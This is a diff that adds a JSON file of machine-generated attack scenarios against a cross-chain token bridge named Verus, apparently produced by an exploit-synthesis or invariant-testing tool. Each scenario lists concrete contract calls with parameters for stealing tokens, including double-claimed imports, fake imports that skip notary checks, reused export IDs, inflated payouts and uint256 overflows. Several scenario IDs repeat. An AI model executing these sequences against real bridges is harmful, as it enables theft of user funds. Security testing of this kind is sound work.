@@ -1,0 +1,807 @@
+{
+  "bridge_name": "verus",
+  "scenarios": [
+    {
+      "scenario_id": "verus_bridge_exploit_1",
+      "target_invariant": "deposit_withdraw_balance_match",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "metpassport_20220206",
+        "meterio_20220205",
+        "qubit_20220127"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "VerusExportSurrogate",
+          "function": "export(bytes32,address,uint256)",
+          "params": {
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001",
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate export of 100 tokens to attacker"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "100000000000000000000",
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001"
+          },
+          "description": "Claim the imported tokens before the export is recorded"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "100000000000000000000",
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001"
+          },
+          "description": "Double-claim the same imported tokens"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Initiate export of 100 tokens to attacker"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Claim the imported tokens before the export is recorded"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Double-claim the same imported tokens"
+        }
+      ]
+    },
+    {
+      "scenario_id": "verus_bridge_fake_export",
+      "target_invariant": "export_requires_notary_verification",
+      "vulnerability_class": "fake_deposit",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "nomad_20220801",
+        "bnbbridge_20221007"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "100000000000000000000",
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001"
+          },
+          "description": "Directly submit a fake import without notary verification"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Directly submit a fake import without notary verification"
+        }
+      ]
+    },
+    {
+      "scenario_id": "verus_bridge_exploit_20240401",
+      "target_invariant": "import_requires_export_commit",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "nomad_20220801",
+        "crosscurve_20260131"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "1000000000000000000000",
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001"
+          },
+          "description": "Submit an import with a fabricated exportId to claim tokens without a corresponding export"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Submit an import with a fabricated exportId to claim tokens without a corresponding export"
+        }
+      ]
+    },
+    {
+      "scenario_id": "verus_bridge_export_id_reuse",
+      "target_invariant": "unique_export_ids",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.5,
+      "retrieved_exploits": [
+        "thorchain_20210716",
+        "meterpassport_20220206"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "VerusExportSurrogate",
+          "function": "export(bytes32,address,uint256)",
+          "params": {
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b",
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Reuse the same export ID '0x000000000000000000000000000000000000000000000000000000000000000b' to trigger another export"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "100000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Claim the imported tokens using the same export ID, exploiting the lack of uniqueness check"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Reuse the same export ID '0x000000000000000000000000000000000000000000000000000000000000000b' to trigger another export"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Claim the imported tokens using the same export ID, exploiting the lack of uniqueness check"
+        }
+      ]
+    },
+    {
+      "scenario_id": "verus_bridge_zero_amount_export",
+      "target_invariant": "export_amount_positive",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "metpassport_20220206",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "VerusExportSurrogate",
+          "function": "export(bytes32,address,uint256)",
+          "params": {
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001",
+            "recipient": "attacker",
+            "amount": "0"
+          },
+          "description": "Trigger export with zero amount, which will emit an ExportEvent with amount=0"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "100000000000000000000",
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001"
+          },
+          "description": "Submit import for the zero-amount export, claiming a large payout"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Trigger export with zero amount, which will emit an ExportEvent with amount=0"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Submit import for the zero-amount export, claiming a large payout"
+        }
+      ]
+    },
+    {
+      "scenario_id": "verus_bridge_exploit",
+      "target_invariant": "import_amount_matches_export",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "metpassport_20220206",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "VerusExportSurrogate",
+          "function": "export(bytes32,address,uint256)",
+          "params": {
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001",
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate export with 100 tokens to attacker"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "200000000000000000000",
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001"
+          },
+          "description": "Claim double the exported amount (200 tokens) for the same exportId"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Initiate export with 100 tokens to attacker"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Claim double the exported amount (200 tokens) for the same exportId"
+        }
+      ]
+    },
+    {
+      "scenario_id": "verus_bridge_export_replay",
+      "target_invariant": "token_lock_on_export",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "meterio_20220205",
+        "metpassport_20220206"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "VerusExportSurrogate",
+          "function": "export(bytes32,address,uint256)",
+          "params": {
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b",
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Export tokens with the same exportId as a previous valid export"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "100000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Claim the exported tokens on the destination chain using the same exportId"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Export tokens with the same exportId as a previous valid export"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Claim the exported tokens on the destination chain using the same exportId"
+        }
+      ]
+    },
+    {
+      "scenario_id": "verus_bridge_double_spend",
+      "target_invariant": "no_double_spend_imports",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "feg_bridge_20241229",
+        "meterpassport_20220206"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "VerusExportSurrogate",
+          "function": "export(bytes32,address,uint256)",
+          "params": {
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001",
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate export of 100 tokens to attacker's address"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "100000000000000000000",
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001"
+          },
+          "description": "First import of the exported tokens"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "100000000000000000000",
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001"
+          },
+          "description": "Second import of the same exported tokens, exploiting missing import tracking"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Initiate export of 100 tokens to attacker's address"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "First import of the exported tokens"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Second import of the same exported tokens, exploiting missing import tracking"
+        }
+      ]
+    },
+    {
+      "scenario_id": "verus_bridge_zero_recipient",
+      "target_invariant": "export_recipient_non_zero",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "chainswap_20210711",
+        "nomad_20220801"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "VerusExportSurrogate",
+          "function": "export(bytes32,address,uint256)",
+          "params": {
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000c",
+            "recipient": "0x0000000000000000000000000000000000000000",
+            "amount": "100000000000000000000"
+          },
+          "description": "Export with zero address recipient, violating the invariant"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "100000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000c"
+          },
+          "description": "Claim the exported amount to attacker's address"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Export with zero address recipient, violating the invariant"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Claim the exported amount to attacker's address"
+        }
+      ]
+    },
+    {
+      "scenario_id": "verusbridge_import_recipient_mismatch",
+      "target_invariant": "import_recipient_matches_export",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "crosscurve_20260131"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "VerusExportSurrogate",
+          "function": "export(bytes32,address,uint256)",
+          "params": {
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000c",
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Export 100 tokens with exportId 0x0c and recipient as attacker"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "100000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000c"
+          },
+          "description": "Submit imports with exportId 0x0c and recipient as attacker, bypassing recipient check"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Export 100 tokens with exportId 0x0c and recipient as attacker"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Submit imports with exportId 0x0c and recipient as attacker, bypassing recipient check"
+        }
+      ]
+    },
+    {
+      "scenario_id": "verus_bridge_exploit",
+      "target_invariant": "notary_verification_before_commit",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "nomad_20220801"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "100000000000000000000",
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001"
+          },
+          "description": "Directly submit an import without prior export verification, exploiting the lack of notary verification in the bridge."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Directly submit an import without prior export verification, exploiting the lack of notary verification in the bridge."
+        }
+      ]
+    },
+    {
+      "scenario_id": "verus_bridge_export_id_reuse",
+      "target_invariant": "export_id_not_reused",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.5,
+      "retrieved_exploits": [
+        "thorchain_20210716",
+        "meterpassport_20220206"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "VerusExportSurrogate",
+          "function": "export(bytes32,address,uint256)",
+          "params": {
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b",
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Reuse the same export ID that was previously used by 0x000000000000000000000000000000000000Ab01 to trigger a new export event."
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "100000000000000000000",
+            "exportId": "0x000000000000000000000000000000000000000000000000000000000000000b"
+          },
+          "description": "Submit imports using the same export ID to claim tokens again."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Reuse the same export ID that was previously used by 0x000000000000000000000000000000000000Ab01 to trigger a new export event."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Submit imports using the same export ID to claim tokens again."
+        }
+      ]
+    },
+    {
+      "scenario_id": "verus_bridge_exploit_1",
+      "target_invariant": "token_balance_non_negative",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "meterio_20220205",
+        "metpassport_20220206"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "VerusExportSurrogate",
+          "function": "export(bytes32,address,uint256)",
+          "params": {
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001",
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate export of 100 tokens to attacker"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "100000000000000000000",
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001"
+          },
+          "description": "Claim the exported tokens without waiting for relay"
+        },
+        {
+          "step": 3,
+          "chain": "source",
+          "contract": "VerusExportSurrogate",
+          "function": "export(bytes32,address,uint256)",
+          "params": {
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000002",
+            "recipient": "attacker",
+            "amount": "100000000000000000000"
+          },
+          "description": "Initiate another export of the same 100 tokens"
+        },
+        {
+          "step": 4,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "100000000000000000000",
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000002"
+          },
+          "description": "Claim the second export of the same tokens"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Initiate export of 100 tokens to attacker"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Claim the exported tokens without waiting for relay"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Initiate another export of the same 100 tokens"
+        },
+        {
+          "waypoint_id": "w4",
+          "after_step": 4,
+          "predicate": "step_4_executed",
+          "description": "Claim the second export of the same tokens"
+        }
+      ]
+    },
+    {
+      "scenario_id": "verus_bridge_export_overflow",
+      "target_invariant": "export_commit_non_negative",
+      "vulnerability_class": "arithmetic_overflow",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "metpassport_20220206",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "SrcVRSC",
+          "function": "approve(address,uint256)",
+          "params": {
+            "spender": "VerusExportSurrogate",
+            "amount": "115792089237316195423570985008687907853269984665640564039457584007913129639935"
+          },
+          "description": "Approve maximum amount to VerusExportSurrogate"
+        },
+        {
+          "step": 2,
+          "chain": "source",
+          "contract": "VerusExportSurrogate",
+          "function": "export(bytes32,address,uint256)",
+          "params": {
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001",
+            "recipient": "attacker",
+            "amount": "115792089237316195423570985008687907853269984665640564039457584007913129639935"
+          },
+          "description": "Trigger export with maximum uint256 amount"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "1000000000000000000000000",
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001"
+          },
+          "description": "Claim large payout for the overflowed export"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Approve maximum amount to VerusExportSurrogate"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Trigger export with maximum uint256 amount"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Claim large payout for the overflowed export"
+        }
+      ]
+    },
+    {
+      "scenario_id": "verus_bridge_overflow",
+      "target_invariant": "import_amount_non_negative",
+      "vulnerability_class": "integer_overflow",
+      "confidence": 0.8,
+      "retrieved_exploits": [
+        "metpassport_20220206",
+        "thorchain_20210629"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "source",
+          "contract": "VerusExportSurrogate",
+          "function": "export(bytes32,address,uint256)",
+          "params": {
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001",
+            "recipient": "attacker",
+            "amount": "1"
+          },
+          "description": "Initiate a small export to trigger the relay"
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "115792089237316195423570985008687907853269984665640564039457584007913129639935",
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001"
+          },
+          "description": "Submit an import with max uint256 value to overflow the claimed amount"
+        },
+        {
+          "step": 3,
+          "chain": "destination",
+          "contract": "VerusBridge",
+          "function": "submitImports(address,uint256,bytes32)",
+          "params": {
+            "recipient": "attacker",
+            "payout": "1",
+            "exportId": "0x0000000000000000000000000000000000000000000000000000000000000001"
+          },
+          "description": "Trigger the overflow to make claimed[exportId] wrap around to 0"
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Initiate a small export to trigger the relay"
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Submit an import with max uint256 value to overflow the claimed amount"
+        },
+        {
+          "waypoint_id": "w3",
+          "after_step": 3,
+          "predicate": "step_3_executed",
+          "description": "Trigger the overflow to make claimed[exportId] wrap around to 0"
+        }
+      ]
+    }
+  ]
+}
